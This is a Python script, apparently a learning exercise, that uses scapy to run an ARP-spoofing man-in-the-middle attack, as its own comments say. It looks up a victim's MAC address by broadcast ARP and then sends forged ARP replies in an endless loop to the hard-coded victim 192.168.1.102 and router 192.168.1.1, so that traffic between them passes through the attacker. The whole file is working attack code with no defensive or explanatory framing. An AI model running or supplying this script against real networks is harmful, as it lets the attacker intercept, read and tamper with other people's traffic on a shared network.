#!/usr/bin/env python

import scapy.all as scapy  # arp SPOOFING MITM attack
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether



# def spoofing(target_ip, spoofed_ip): #telling the target we are this ip

def getting_mac(ip):
    req_arp = scapy.ARP(pdst=ip)
    broadcastmac = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # set dst mac as broadcast mac
    broadcast_arp_req = broadcastmac / req_arp
    answering_list = scapy.srp(broadcast_arp_req, timeout=1, verbose=False)[0]

    return answering_list[0][1].hwsrc  # first element, access the first IP, access element mac using hwsrc, return the MAC address of the IP we give

def spoofarp(target_ip, spoofed_ip):
    target_mac = getting_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)  # fooling target that it is the router #hwdst is mac address and psrc is target IP
    scapy.send(packet, verbose=False)

def arp_spoof(target_ip: str, spoofed_ip: str):
    spoofarp(target_ip, spoofed_ip)
    spoofarp(spoofed_ip, target_ip)


if __name__ == '__main__':
    while (True):
        arp_spoof("192.168.1.102", "192.168.1.1")
# spoofarp("10.0.2.15", "10.0.2.2")# tell the computer i am the router
# spoofarp("10.0.2.2", "10.0.2.15")# tell the router i am the victim
# #IP of the target computer, pdst and hwdst is mac address of target machine
# #source IP psrc (ip of router) op sent as a arp response
